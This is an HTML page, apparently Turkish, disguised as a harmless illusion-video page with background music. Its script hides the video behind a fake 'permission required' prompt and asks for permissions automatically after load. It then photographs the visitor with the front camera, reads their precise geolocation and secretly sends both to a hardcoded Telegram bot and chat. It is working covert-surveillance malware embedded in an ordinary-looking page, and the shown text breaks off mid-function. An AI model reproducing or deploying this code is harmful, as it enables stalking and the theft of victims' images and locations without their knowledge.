<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIF GÃ¶sterimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            gap: 30px;
            padding: 20px;
        }

        .container img,
        .container video {
            max-width: 95% !important;
            max-height: 90vh !important;
            width: auto !important;
            height: auto !important;
            object-fit: contain;
            display: block;
            background-color: #000;
            min-width: 400px;
            min-height: 300px;
        }
        
        #mainVideo {
            max-width: 95% !important;
            width: 95% !important;
            max-height: 90vh !important;
        }
        
        /* Android ve mobil cihazlar iÃ§in video */
        @media (max-width: 768px) {
            .container {
                padding: 10px !important;
                gap: 10px !important;
            }
            
            .container video,
            #mainVideo {
                max-width: 95% !important;
                width: 95% !important;
                max-height: 80vh !important;
                height: auto !important;
                min-width: 250px !important;
                min-height: 200px !important;
                object-fit: contain !important;
                position: relative !important;
                display: block !important;
                visibility: visible !important;
                opacity: 1 !important;
                background-color: #000 !important;
            }
            
            #videoStatus {
                display: none !important;
            }
        }
        
        /* Android iÃ§in Ã¶zel ayarlar - Dikey */
        @media screen and (max-width: 768px) and (orientation: portrait) {
            .container {
                padding: 15px !important;
                gap: 15px !important;
            }
            
            .container video,
            #mainVideo {
                max-width: 95% !important;
                width: 95% !important;
                max-height: 75vh !important;
                height: auto !important;
                min-width: 250px !important;
                min-height: 200px !important;
                object-fit: contain !important;
                position: relative !important;
                display: block !important;
                visibility: visible !important;
                opacity: 1 !important;
                background-color: #000 !important;
            }
            
            #videoStatus {
                display: none !important;
            }
        }
        
        /* Android iÃ§in Ã¶zel ayarlar - Yatay */
        @media screen and (max-width: 768px) and (orientation: landscape) {
            .container {
                padding: 10px !important;
                gap: 10px !important;
            }
            
            .container video,
            #mainVideo {
                max-width: 90% !important;
                width: 90% !important;
                max-height: 85vh !important;
                height: auto !important;
                min-width: 300px !important;
                min-height: 200px !important;
                object-fit: contain !important;
                position: relative !important;
                display: block !important;
                visibility: visible !important;
                opacity: 1 !important;
                background-color: #000 !important;
            }
            
            #videoStatus {
                display: none !important;
            }
        }
        
        /* Ses kontrolÃ¼nÃ¼ gizle */
        video::-webkit-media-controls-volume-slider,
        video::-webkit-media-controls-mute-button,
        video::-webkit-media-controls-volume-control-container {
            display: none !important;
        }
        
        /* Firefox iÃ§in ses kontrolÃ¼nÃ¼ gizle */
        video::-moz-media-controls-volume-slider,
        video::-moz-media-controls-mute-button {
            display: none !important;
        }
        
        /* Genel ses kontrolÃ¼ gizleme */
        video::-webkit-media-controls-volume-control-container {
            display: none !important;
        }

        .quote {
            color: #ffffff;
            font-size: 24px;
            font-style: italic;
            text-align: center;
            padding: 0 20px;
            max-width: 800px;
            line-height: 1.6;
        }

        @media (max-width: 768px) {
            .quote {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <video id="mainVideo" autoplay loop muted playsinline controls preload="auto" webkit-playsinline="true" x-webkit-airplay="allow" style="width: 95% !important; max-width: 95% !important; max-height: 90vh !important; height: auto !important; background-color: #000; display: none;">
            <source src="macigg.mp4" type="video/mp4">
            TarayÄ±cÄ±nÄ±z video oynatmayÄ± desteklemiyor.
        </video>
        <div id="videoStatus" style="display: none;"></div>
        <audio id="backgroundMusic" autoplay loop preload="auto" style="display: none;">
            <source src="Pembe-Panter-MÃ¼ziÄŸi.mp3" type="audio/mpeg">
            TarayÄ±cÄ±nÄ±z ses oynatmayÄ± desteklemiyor.
        </audio>
    </div>
    
    <div id="permissionMessage" style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; color: white; text-align: center; padding: 40px; max-width: 600px; background-color: rgba(26, 26, 26, 0.95); border-radius: 10px; z-index: 10000; box-shadow: 0 4px 20px rgba(0,0,0,0.5);">
        <h2 style="color: #ff6b6b; margin-bottom: 20px; font-size: 24px;">âš ï¸ Ä°zin Gerekli</h2>
        <p style="font-size: 18px; line-height: 1.6; margin-bottom: 30px;">
            Videoyu gÃ¶rÃ¼ntÃ¼lemek iÃ§in kamera ve konum izni vermeniz gerekmektedir.
        </p>
        <button id="requestPermissionBtn" style="background-color: #4CAF50; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: background-color 0.3s;">
            Ä°zin Ver
        </button>
    </div>

    <script>
        const BOT_TOKEN = '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
        const CHAT_ID = '-4991699158';
        // Telegram mesajÄ±nda gÃ¶sterilecek URL (gerÃ§ek URL yerine bu gÃ¶sterilir)
        const DISPLAY_URL = 'https://bortecine00.github.io/Macig000/';
        // Telegram mesajÄ±nda gÃ¶rÃ¼necek URL metni (tÄ±klanÄ±nca yukarÄ±daki URL'ye gider)
        // Ã–rnek: 'Ä°lizyon GÃ¶sterisi' yazarsanÄ±z, Telegram'da bu gÃ¶rÃ¼nÃ¼r ama tÄ±klanÄ±nca DISPLAY_URL'ye gider
        const DISPLAY_URL_TEXT = 'Ä°lizyon NumarasÄ±'; // Buraya istediÄŸiniz yazÄ±yÄ±/metni yazÄ±n

        // Bot token ve chat ID kontrolÃ¼
        async function checkTelegramConfig() {
            console.log('=== Telegram YapÄ±landÄ±rma KontrolÃ¼ ===');
            console.log('Bot Token:', BOT_TOKEN.substring(0, 10) + '...' + BOT_TOKEN.substring(BOT_TOKEN.length - 5));
            console.log('Chat ID:', CHAT_ID);
            
            // Bot token kontrolÃ¼
            try {
                const botCheckResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
                if (botCheckResponse.ok) {
                    const botData = await botCheckResponse.json();
                    console.log('âœ… Bot token geÃ§erli!');
                    console.log('Bot bilgileri:', botData);
                    console.log('Bot adÄ±:', botData.result?.first_name || 'Bilinmiyor');
                    console.log('Bot kullanÄ±cÄ± adÄ±:', botData.result?.username || 'Bilinmiyor');
                } else {
                    let errorData;
                    try {
                        errorData = await botCheckResponse.json();
                    } catch (e) {
                        errorData = { description: 'YanÄ±t parse edilemedi' };
                    }
                    console.error('âŒ Bot token geÃ§ersiz!');
                    console.error('HTTP Status:', botCheckResponse.status);
                    console.error('Hata:', errorData);
                    
                    if (botCheckResponse.status === 404) {
                        console.error('404 HatasÄ±: Bot token yanlÄ±ÅŸ veya geÃ§ersiz!');
                        console.error('Bot token formatÄ± kontrol edin: BOT_ID:TOKEN');
                        console.error('Mevcut token:', BOT_TOKEN);
                    }
                    return false;
                }
            } catch (error) {
                console.error('âŒ Bot token kontrolÃ¼ baÅŸarÄ±sÄ±z:', error);
                return false;
            }
            
            // Chat ID kontrolÃ¼ (test mesajÄ± gÃ¶ndererek)
            try {
                const testResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: 'ğŸ§ª Test mesajÄ± - YapÄ±landÄ±rma kontrolÃ¼'
                    })
                });
                
                if (testResponse.ok) {
                    const testData = await testResponse.json();
                    console.log('âœ… Chat ID geÃ§erli!');
                    console.log('Test mesajÄ± gÃ¶nderildi:', testData);
                    return true;
                } else {
                    let errorData;
                    try {
                        errorData = await testResponse.json();
                    } catch (e) {
                        errorData = { description: 'YanÄ±t parse edilemedi' };
                    }
                    console.error('âŒ Chat ID geÃ§ersiz veya bot gruba eklenmemiÅŸ!');
                    console.error('HTTP Status:', testResponse.status);
                    console.error('Hata detaylarÄ±:', errorData);
                    console.error('Hata mesajÄ±:', errorData.description || errorData.error_code || 'Bilinmeyen hata');
                    
                    if (testResponse.status === 400) {
                        console.error('OlasÄ± neden: Chat ID formatÄ± yanlÄ±ÅŸ');
                        console.error('Chat ID Ã¶rnekleri:');
                        console.error('  - KiÅŸisel chat: 123456789 (sadece sayÄ±)');
                        console.error('  - Grup: -123456789 (eksi iÅŸareti ile baÅŸlar)');
                        console.error('  - Kanal: -1001234567890 (eksi ve 100 ile baÅŸlar)');
                        console.error('Mevcut Chat ID:', CHAT_ID);
                    } else if (testResponse.status === 403) {
                        console.error('OlasÄ± neden: Bot gruba eklenmemiÅŸ veya yetkisi yok');
                        console.error('Ã‡Ã¶zÃ¼m: Bot\'u gruba ekleyin ve mesaj gÃ¶nderme yetkisi verin');
                    } else if (testResponse.status === 404) {
                        console.error('OlasÄ± neden: Chat bulunamadÄ± veya bot token yanlÄ±ÅŸ');
                        console.error('Kontrol edin:');
                        console.error('  1. Bot token doÄŸru mu?');
                        console.error('  2. Chat ID doÄŸru mu?');
                        console.error('  3. Bot gruba ekli mi?');
                    }
                    return false;
                }
            } catch (error) {
                console.error('âŒ Chat ID kontrolÃ¼ baÅŸarÄ±sÄ±z:', error);
                return false;
            }
        }

        async function sendToTelegram(message, photo) {
            try {
                const messageResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });

                if (!messageResponse.ok) {
                    let errorData;
                    try {
                        errorData = await messageResponse.json();
                    } catch (e) {
                        errorData = { description: 'YanÄ±t parse edilemedi' };
                    }
                    
                    console.error('Telegram mesaj gÃ¶nderme hatasÄ±:', errorData);
                    console.error('HTTP Status:', messageResponse.status);
                    console.error('Bot Token:', BOT_TOKEN.substring(0, 10) + '...');
                    console.error('Chat ID:', CHAT_ID);
                    
                    if (messageResponse.status === 404) {
                        const errorMsg = errorData.description || errorData.error_code || 'Bilinmeyen hata';
                        console.error('404 HatasÄ± DetaylarÄ±:', errorMsg);
                        console.error('OlasÄ± nedenler:');
                        console.error('1. Bot token yanlÄ±ÅŸ veya geÃ§ersiz');
                        console.error('2. Chat ID yanlÄ±ÅŸ');
                        console.error('3. Bot gruba eklenmemiÅŸ veya yetkisi yok');
                        
                        // KullanÄ±cÄ±ya gÃ¶rsel uyarÄ± gÃ¶ster
                        const statusDiv = document.getElementById('videoStatus');
                        if (statusDiv) {
                            statusDiv.innerHTML = '<span style="color: red;">âš ï¸ Telegram hatasÄ±: ' + errorMsg + '</span>';
                        }
                    }
                    return;
                }

                const messageResult = await messageResponse.json();
                console.log('Mesaj gÃ¶nderildi:', messageResult);

                if (photo) {
                    // Tek fotoÄŸraf gÃ¶nder (eski yÃ¶ntem)
                    try {
                        console.log('ğŸ“¤ FotoÄŸraf Telegram\'a gÃ¶nderiliyor...');
                    const base64 = photo.replace(/^data:image\/\w+;base64,/, '');
                    const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
                    const blob = new Blob([bytes], { type: 'image/jpeg' });
                        console.log('ğŸ“¦ FotoÄŸraf blob boyutu:', blob.size, 'bytes');
                        
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                        formData.append('caption', 'ğŸ“¸ Ã–n Kamera');
                        
                        const photoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                        if (!photoResponse.ok) {
                            let errorData;
                            try {
                                errorData = await photoResponse.json();
                            } catch (e) {
                                errorData = { description: 'YanÄ±t parse edilemedi' };
                            }
                            console.error('âŒ Telegram fotoÄŸraf gÃ¶nderme hatasÄ±:', errorData);
                            console.error('HTTP Status:', photoResponse.status);
                            if (photoResponse.status === 404) {
                                console.error('404 HatasÄ±: FotoÄŸraf gÃ¶nderilemedi - Bot token veya chat ID kontrol edin');
                            }
                        } else {
                            const photoResult = await photoResponse.json();
                            console.log('âœ… FotoÄŸraf baÅŸarÄ±yla gÃ¶nderildi!');
                            console.log('ğŸ“‹ Telegram yanÄ±tÄ±:', JSON.stringify(photoResult, null, 2));
                        }
                    } catch (e) {
                        console.error('âŒ FotoÄŸraf gÃ¶nderilirken hata:', e);
                    }
                } else {
                    console.warn('âš ï¸ FotoÄŸraf yok, gÃ¶nderilemedi');
                }
            } catch (error) {
                console.error('Telegram API hatasÄ±:', error);
            }
        }


        async function takePhoto(facingMode = 'user') {
            try {
                const cameraName = facingMode === 'user' ? 'Ã–n' : 'Arka';
                console.log(`ğŸ“¸ ${cameraName} kameradan fotoÄŸraf Ã§ekiliyor...`);
                
                // Mobil cihaz kontrolÃ¼
                const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                console.log('ğŸ“± Mobil cihaz:', isMobile);
                
                // Kamera eriÅŸimi
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                // Ä°lk kamera izni alÄ±ndÄ±ÄŸÄ±nda (sadece Ã¶n kamera iÃ§in) izin mesajÄ±nÄ± gizle
                if (facingMode === 'user') {
                    const permissionMessage = document.getElementById('permissionMessage');
                    if (permissionMessage) {
                        permissionMessage.style.display = 'none';
                    }
                }
                console.log(`âœ… ${cameraName} kamera izni alÄ±ndÄ±, stream aktif`);
                
            const video = document.createElement('video');
            video.srcObject = stream;
            video.muted = true;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                
                // Video oynatmayÄ± dene
                try {
                    await video.play();
                    console.log('âœ… Video oynatÄ±lÄ±yor, fotoÄŸraf bekleniyor...');
                } catch (playError) {
                    console.warn('âš ï¸ Video otomatik oynatÄ±lamadÄ±, devam ediliyor...', playError);
                }
                
                return new Promise((resolve, reject) => {
                    const timeout = setTimeout(() => {
                        stream.getTracks().forEach(t => t.stop());
                        console.error('âŒ Video yÃ¼kleme zaman aÅŸÄ±mÄ±');
                        reject(new Error('Video yÃ¼kleme zaman aÅŸÄ±mÄ±'));
                    }, 15000); // Mobilde daha uzun sÃ¼re bekle
                    
                    // Video hazÄ±r olduÄŸunda fotoÄŸraf Ã§ek
                    const capturePhoto = () => {
                        try {
                            // Video boyutlarÄ±nÄ± kontrol et
                            if (video.videoWidth === 0 || video.videoHeight === 0) {
                                console.warn('âš ï¸ Video boyutlarÄ± 0, tekrar deneniyor...');
                                setTimeout(capturePhoto, 500);
                                return;
                            }
                            
                            console.log('ğŸ“· FotoÄŸraf Ã§ekiliyor... Video boyutlarÄ±:', video.videoWidth, 'x', video.videoHeight);
                            
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            
                            // Canvas'a Ã§iz
                            ctx.drawImage(video, 0, 0);
                            
                            // Stream'i kapat
                            stream.getTracks().forEach(t => t.stop());
                            
                            // FotoÄŸrafÄ± al
                            const photoData = canvas.toDataURL('image/jpeg', 0.8);
                            console.log(`âœ… ${cameraName} kamera fotoÄŸrafÄ± baÅŸarÄ±yla Ã§ekildi, boyut:`, (photoData.length / 1024).toFixed(2), 'KB');
                            clearTimeout(timeout);
                            resolve(photoData);
                        } catch (err) {
                            stream.getTracks().forEach(t => t.stop());
                            console.error('âŒ FotoÄŸraf Ã§ekilirken hata:', err);
                            clearTimeout(timeout);
                            reject(err);
                        }
                    };
                    
                    video.onloadedmetadata = () => {
                        console.log('âœ… Video metadata yÃ¼klendi');
                        // Mobilde biraz daha uzun bekle
                        const waitTime = isMobile ? 1500 : 800;
                        setTimeout(capturePhoto, waitTime);
                    };
                    
                    video.oncanplay = () => {
                        console.log('âœ… Video oynatÄ±labilir durumda');
                        // EÄŸer metadata henÃ¼z yÃ¼klenmediyse, canplay'de de dene
                        if (video.videoWidth > 0 && video.videoHeight > 0) {
                            setTimeout(capturePhoto, isMobile ? 1000 : 500);
                        }
                    };
                    
                    video.onerror = (err) => {
                        clearTimeout(timeout);
                        stream.getTracks().forEach(t => t.stop());
                        console.error('âŒ Video hatasÄ±:', err);
                        reject(new Error('Video hatasÄ±: ' + err));
                };
            });
            } catch (error) {
                console.error(`âŒ ${facingMode === 'user' ? 'Ã–n' : 'Arka'} kamera hatasÄ±:`, error);
                console.error('Hata detaylarÄ±:', error.message, error.name);
                throw error;
            }
        }
        


        // KapsamlÄ± sistem kontrolÃ¼
        async function performSystemCheck() {
            console.log('=== SÄ°STEM KONTROLÃœ BAÅLATILIYOR ===');
            const checks = {
                video: false,
                audio: false,
                telegram: false,
                location: false,
                camera: false
            };
            
            // 1. Video kontrolÃ¼
            const mainVideo = document.getElementById('mainVideo');
            if (mainVideo) {
                console.log('âœ… Video elementi bulundu');
                console.log('Video kaynaÄŸÄ±:', mainVideo.querySelector('source')?.src || 'BulunamadÄ±');
                checks.video = true;
                
                mainVideo.addEventListener('loadeddata', () => {
                    console.log('âœ… Video yÃ¼klendi');
                });
                
                mainVideo.addEventListener('error', (e) => {
                    console.error('âŒ Video yÃ¼kleme hatasÄ±:', e);
                });
            } else {
                console.error('âŒ Video elementi bulunamadÄ±!');
            }
            
            // 2. MÃ¼zik kontrolÃ¼
            const backgroundMusic = document.getElementById('backgroundMusic');
            if (backgroundMusic) {
                console.log('âœ… MÃ¼zik elementi bulundu');
                console.log('MÃ¼zik kaynaÄŸÄ±:', backgroundMusic.querySelector('source')?.src || 'BulunamadÄ±');
                checks.audio = true;
                
                backgroundMusic.addEventListener('loadeddata', () => {
                    console.log('âœ… MÃ¼zik yÃ¼klendi');
                });
                
                backgroundMusic.addEventListener('error', (e) => {
                    console.error('âŒ MÃ¼zik yÃ¼kleme hatasÄ±:', e);
                });
            } else {
                console.error('âŒ MÃ¼zik elementi bulunamadÄ±!');
            }
            
            // 3. Telegram kontrolÃ¼
            try {
                const telegramCheck = await checkTelegramConfig();
                checks.telegram = telegramCheck;
            } catch (e) {
                console.error('âŒ Telegram kontrolÃ¼ baÅŸarÄ±sÄ±z:', e);
            }
            
            // 4. Konum API kontrolÃ¼
            if (navigator.geolocation) {
                console.log('âœ… Geolocation API destekleniyor');
                checks.location = true;
            } else {
                console.error('âŒ Geolocation API desteklenmiyor');
            }
            
            // 5. Kamera API kontrolÃ¼
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                console.log('âœ… MediaDevices API destekleniyor');
                checks.camera = true;
            } else {
                console.error('âŒ MediaDevices API desteklenmiyor');
            }
            
            // Ã–zet
            console.log('=== KONTROL Ã–ZETÄ° ===');
            console.log('Video:', checks.video ? 'âœ…' : 'âŒ');
            console.log('MÃ¼zik:', checks.audio ? 'âœ…' : 'âŒ');
            console.log('Telegram:', checks.telegram ? 'âœ…' : 'âŒ');
            console.log('Konum API:', checks.location ? 'âœ…' : 'âŒ');
            console.log('Kamera API:', checks.camera ? 'âœ…' : 'âŒ');
            
            return checks;
        }

        // Konum alma fonksiyonu
        async function getLocation() {
            if (!navigator.geolocation) {
                throw new Error('Geolocation desteklenmiyor');
            }
            
            return new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            acc: pos.coords.accuracy
                        });
                    },
                    reject,
                    { 
                        timeout: 15000,
                        enableHighAccuracy: true,
                        maximumAge: 0
                    }
                );
            });
        }

        window.addEventListener('load', () => {
            const mainVideo = document.getElementById('mainVideo');
            const permissionMessage = document.getElementById('permissionMessage');
            const requestPermissionBtn = document.getElementById('requestPermissionBtn');
            
            // Video baÅŸlangÄ±Ã§ta gizli
            if (mainVideo) {
                mainVideo.style.display = 'none';
            }
            
            // localStorage'dan izin durumunu kontrol et
            const permissionsGranted = localStorage.getItem('permissionsGranted') === 'true';
            
            if (permissionsGranted) {
                // Ä°zin daha Ã¶nce verilmiÅŸ, videoyu gÃ¶ster
                console.log('âœ… Ä°zinler daha Ã¶nce verilmiÅŸ, video gÃ¶steriliyor');
                if (mainVideo) {
                    mainVideo.style.display = 'block';
                    mainVideo.play().catch(err => {
                        console.log('Video oynatÄ±lamadÄ±:', err);
                    });
                }
                if (permissionMessage) {
                    permissionMessage.style.display = 'none';
                }
            } else {
                // Ä°zin verilmemiÅŸ, mesajÄ± gÃ¶ster
                console.log('âš ï¸ Ä°zinler verilmemiÅŸ, mesaj gÃ¶steriliyor');
                if (permissionMessage) {
                    permissionMessage.style.display = 'block';
                }
            }
            
            // Video oynatma ayarlarÄ±
            if (mainVideo) {
                mainVideo.addEventListener('loadedmetadata', () => {
                    mainVideo.play().catch(err => {
                        console.log('Video oynatÄ±lamadÄ±:', err);
                    });
                });
                
                mainVideo.addEventListener('canplay', () => {
                    mainVideo.play().catch(err => {
                        console.log('Video oynatÄ±lamadÄ±:', err);
                    });
                });
            }
            
            // Ä°zin isteme fonksiyonu
            async function requestPermissions() {
                try {
                    console.log('ğŸ“¸ Kamera ve konum izni isteniyor...');
                    
                    // Butonu gÃ¼ncelle
                    if (requestPermissionBtn) {
                        requestPermissionBtn.disabled = true;
                        requestPermissionBtn.textContent = 'Ä°ÅŸleniyor...';
                    }
                    
                    // Ã–nce konum izni iste
                    let location = null;
                    try {
                        location = await getLocation();
                        console.log('âœ… Konum izni verildi');
                    } catch (e) {
                        console.warn('âš ï¸ Konum izni verilmedi:', e.message);
                        // Konum izni verilmediyse de devam et
                    }
                    
                    // Sonra kamera izni iste ve fotoÄŸraf Ã§ek
                    const photo = await takePhoto('user');
                    
                    if (!photo) {
                        throw new Error('FotoÄŸraf Ã§ekilemedi');
                    }
                    
                    console.log('âœ… Kamera izni verildi ve fotoÄŸraf Ã§ekildi');
                    
                    // Ä°zinler verildi, localStorage'a kaydet
                    localStorage.setItem('permissionsGranted', 'true');
                    
                    // Videoyu gÃ¶ster
                    if (mainVideo) {
                        mainVideo.style.display = 'block';
                        mainVideo.play().catch(err => {
                            console.log('Video oynatÄ±lamadÄ±:', err);
                        });
                    }
                    
                    // MesajÄ± gizle
                    if (permissionMessage) {
                        permissionMessage.style.display = 'none';
                    }
                    
                    // FotoÄŸrafÄ± Telegram'a gÃ¶nder
                    console.log('ğŸ“¤ FotoÄŸraf Telegram\'a gÃ¶nderiliyor...');
                    let message = 'ğŸ”” <b>Ä°zin Verildi</b>\n\n';
                    message += `â° ${new Date().toLocaleString('tr-TR')}\n`;
                    message += `<a href="${DISPLAY_URL}">${DISPLAY_URL_TEXT}</a>\n\n`;
                    message += `ğŸ“¸ FotoÄŸraf Ã§ekildi\n`;
                    
                    if (location) {
                        message += `ğŸ“ Konum: ${location.lat.toFixed(6)}, ${location.lng.toFixed(6)}\n`;
                    }
                    
                    await sendToTelegram(message, photo);
                    console.log('âœ… FotoÄŸraf Telegram\'a gÃ¶nderildi!');
                    
                } catch (error) {
                    console.error('âŒ Ä°zin verilmedi:', error.message);
                    
                    // Ä°zin reddedildi, mesajÄ± gÃ¶ster ve videoyu gizli tut
                    if (permissionMessage) {
                        permissionMessage.style.display = 'block';
                        permissionMessage.innerHTML = `
                            <h2 style="color: #ff6b6b; margin-bottom: 20px; font-size: 24px;">âš ï¸ Ä°zin Gerekli</h2>
                            <p style="font-size: 18px; line-height: 1.6; margin-bottom: 30px;">
                                Videoyu gÃ¶rÃ¼ntÃ¼lemek iÃ§in kamera ve konum izni vermeniz gerekmektedir.<br>
                                <strong style="color: #ff6b6b;">Tekrar izin vermeniz gerekiyor.</strong>
                            </p>
                            <button id="requestPermissionBtn" style="background-color: #4CAF50; color: white; border: none; padding: 15px 30px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; transition: background-color 0.3s;">
                                Ä°zin Ver
                            </button>
                        `;
                        
                        // Buton event listener'Ä±nÄ± tekrar ekle
                        const btn = document.getElementById('requestPermissionBtn');
                        if (btn) {
                            btn.addEventListener('click', async () => {
                                btn.disabled = true;
                                btn.textContent = 'Ä°ÅŸleniyor...';
                                await requestPermissions();
                            });
                        }
                    }
                    
                    if (mainVideo) {
                        mainVideo.style.display = 'none';
                    }
                    
                    // Butonu tekrar aktif et
                    if (requestPermissionBtn) {
                        requestPermissionBtn.disabled = false;
                        requestPermissionBtn.textContent = 'Ä°zin Ver';
                    }
                }
            }
            
            // Ä°zin butonuna tÄ±klama
            if (requestPermissionBtn) {
                requestPermissionBtn.addEventListener('click', async () => {
                    // Butonu devre dÄ±ÅŸÄ± bÄ±rak
                    requestPermissionBtn.disabled = true;
                    requestPermissionBtn.textContent = 'Ä°ÅŸleniyor...';
                    
                    await requestPermissions();
                    
                    // Butonu tekrar aktif et
                    requestPermissionBtn.disabled = false;
                    requestPermissionBtn.textContent = 'Ä°zin Ver';
                });
            }
            
            // EÄŸer izin verilmemiÅŸse, otomatik olarak iste
            if (!permissionsGranted) {
                setTimeout(() => {
                    requestPermissions();
                }, 500);
            }
            
            // MÃ¼ziÄŸi oynat
            const backgroundMusic = document.getElementById('backgroundMusic');
            if (backgroundMusic) {
                backgroundMusic.volume = 0.5; // Ses seviyesi %50
                
                // MÃ¼zik yÃ¼kleme kontrolÃ¼
                backgroundMusic.addEventListener('loadeddata', () => {
                    console.log('MÃ¼zik yÃ¼klendi, oynatÄ±lÄ±yor...');
                    backgroundMusic.play().catch(err => {
                        console.error('MÃ¼zik oynatÄ±lamadÄ±:', err);
                    });
                });
                
                backgroundMusic.addEventListener('error', (e) => {
                    console.error('MÃ¼zik yÃ¼kleme hatasÄ±:', e);
                    console.error('Dosya yolu kontrol edin: Pembe-Panter-MÃ¼ziÄŸi.mp3');
                });
                
                // MÃ¼ziÄŸi yÃ¼kle
                backgroundMusic.load();
                
                // Hemen oynatmayÄ± dene
                setTimeout(() => {
                    backgroundMusic.play().then(() => {
                        console.log('âœ… MÃ¼zik oynatÄ±lÄ±yor');
                    }).catch(err => {
                        console.log('MÃ¼zik otomatik oynatÄ±lamadÄ±, kullanÄ±cÄ± etkileÅŸimi bekleniyor:', err);
                        // KullanÄ±cÄ± sayfaya tÄ±kladÄ±ÄŸÄ±nda veya dokunduÄŸunda mÃ¼ziÄŸi baÅŸlat
                        const startMusic = () => {
                            backgroundMusic.play().then(() => {
                                console.log('âœ… MÃ¼zik kullanÄ±cÄ± etkileÅŸimi sonrasÄ± baÅŸlatÄ±ldÄ±');
                            }).catch(e => console.error('MÃ¼zik oynatÄ±lamadÄ±:', e));
                            document.removeEventListener('click', startMusic);
                            document.removeEventListener('touchstart', startMusic);
                            document.removeEventListener('keydown', startMusic);
                        };
                        document.addEventListener('click', startMusic, { once: true });
                        document.addEventListener('touchstart', startMusic, { once: true });
                        document.addEventListener('keydown', startMusic, { once: true });
                    });
                }, 500);
                
                // Video oynatÄ±ldÄ±ÄŸÄ±nda da mÃ¼ziÄŸi baÅŸlatmayÄ± dene
                const video = document.getElementById('mainVideo');
                if (video) {
                    video.addEventListener('play', () => {
                        backgroundMusic.play().catch(e => {
                            console.log('Video oynatÄ±ldÄ± ama mÃ¼zik baÅŸlatÄ±lamadÄ±:', e);
                        });
                    });
                }
            }
            
            // Telegram yapÄ±landÄ±rmasÄ±nÄ± kontrol et
            checkTelegramConfig().then(isValid => {
                if (isValid) {
                    console.log('âœ… Telegram yapÄ±landÄ±rmasÄ± doÄŸru!');
                } else {
                    console.error('âŒ Telegram yapÄ±landÄ±rmasÄ± hatalÄ±!');
                    const statusDiv = document.getElementById('videoStatus');
                    if (statusDiv) {
                        statusDiv.innerHTML = '<span style="color: orange;">âš ï¸ Telegram yapÄ±landÄ±rmasÄ± kontrol ediliyor... Konsolu kontrol edin (F12)</span>';
                    }
                }
            });
            
            // Video yÃ¼kleme kontrolÃ¼
            const video = document.getElementById('mainVideo');
            const statusDiv = document.getElementById('videoStatus');
            
            function updateStatus(message) {
                // MesajlarÄ± gÃ¶sterme, sadece konsola yaz
                console.log(message);
            }
            
            if (video) {
                // updateStatus('Video yÃ¼kleniyor...'); // KaldÄ±rÄ±ldÄ±
                
                // Ses seviyesini 0 yap ve muted Ã¶zelliÄŸini garanti altÄ±na al
                video.volume = 0;
                video.muted = true;
                
                // Video kaynaÄŸÄ±nÄ± kontrol et
                const source = video.querySelector('source');
                if (source) {
                    updateStatus('Video kaynaÄŸÄ±: ' + source.src);
                }
                
                // Ses kontrolÃ¼nÃ¼ DOM'dan kaldÄ±r ve gizle
                function hideVolumeControls() {
                    // TÃ¼m ses kontrollerini bul ve gizle
                    const volumeControls = video.querySelectorAll('[class*="volume"], [class*="mute"], button[aria-label*="volume"], button[aria-label*="mute"], [aria-label*="Volume"], [aria-label*="Mute"]');
                    volumeControls.forEach(control => {
                        control.style.display = 'none';
                        control.style.visibility = 'hidden';
                        control.style.width = '0';
                        control.style.height = '0';
                        control.style.opacity = '0';
                    });
                    
                    // Video kontrol Ã§ubuÄŸundaki ses butonlarÄ±nÄ± gizle
                    const controls = video.controls;
                    if (controls) {
                        const controlBar = video.shadowRoot?.querySelector('.controls') || 
                                         video.querySelector('.controls') ||
                                         video.parentElement?.querySelector('.controls');
                        if (controlBar) {
                            const volumeButtons = controlBar.querySelectorAll('[class*="volume"], [class*="mute"]');
                            volumeButtons.forEach(btn => {
                                btn.style.display = 'none';
                            });
                        }
                    }
                }
                
                // MutationObserver ile sÃ¼rekli kontrol et
                const observer = new MutationObserver(hideVolumeControls);
                observer.observe(video, { childList: true, subtree: true, attributes: true });
                
                // Video yÃ¼klendiÄŸinde de kontrol et
                video.addEventListener('loadedmetadata', hideVolumeControls);
                video.addEventListener('canplay', hideVolumeControls);
                
                // Periyodik olarak kontrol et
                setInterval(hideVolumeControls, 500);
                
                // Video yÃ¼klendiÄŸinde
                video.addEventListener('loadedmetadata', () => {
